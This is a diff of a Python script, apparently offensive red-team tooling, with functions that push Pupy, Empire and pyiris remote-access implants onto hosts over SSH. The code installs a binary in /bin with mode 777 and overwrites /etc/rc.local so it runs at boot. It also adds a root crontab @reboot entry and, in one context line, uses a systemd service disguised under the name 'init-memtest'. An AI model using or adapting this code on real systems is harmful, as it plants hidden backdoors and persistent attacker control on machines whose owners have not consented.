@@ -36,8 +36,8 @@ def pfsense_user(connect):
 
 def pupy(connect):
     #REQUIRES A CLIENT TO BE INSTALLED AND THE MALWAR
-    connect.put('UploadFiles/pupy')
-    connect.sudo('mv pupy /bin/')
+    connect.put('UploadFiles/pupy_linux')
+    connect.sudo('mv pupy_linux /bin/pupy')
     connect.sudo('chmod 777 /bin/pupy')
     connect.sudo("sh -c 'printf \"#!/bin/bash\n/bin/./pupy\nexit 0\" > /etc/rc.local && /bin/./pupy'")
     connect.sudo('/bin/./pupy')
@@ -45,10 +45,10 @@ def pupy(connect):
 
 def empire(connect):
     ###NEEDS MORE WORK
-    connect.put('UploadFiles/empyre.py')
-    connect.sudo('mv empyre.py /tmp/')
-    connect.run('nohup python /tmp/empyre.py &')
-    connect.run("sh -c 'echo \"@reboot python /tmp/empyre.py\" > empyre.txt'")
+    connect.put('UploadFiles/empire.sh')
+    connect.sudo('mv empire.sh /tmp/')
+    connect.run('nohup bash /tmp/empire.sh &')
+    connect.run("sh -c 'echo \"@reboot python /tmp/empire.sh\" > empyre.txt'")
     connect.sudo("crontab -u root empyre.txt")
     connect.run("rm empyre.txt")
 
@@ -115,6 +115,10 @@ def ohad_pyiris(connect):
     connect.sudo('systemctl enable init-memtest.service')
     connect.sudo('systemctl start init-memtest.service')
     # connect.sudo('screen -d -m /boot/grub/./initrdMemTest')
+
+
+#Depreciation Area
+##########################################################################################
 
 
 def ohad_vnc(connect):
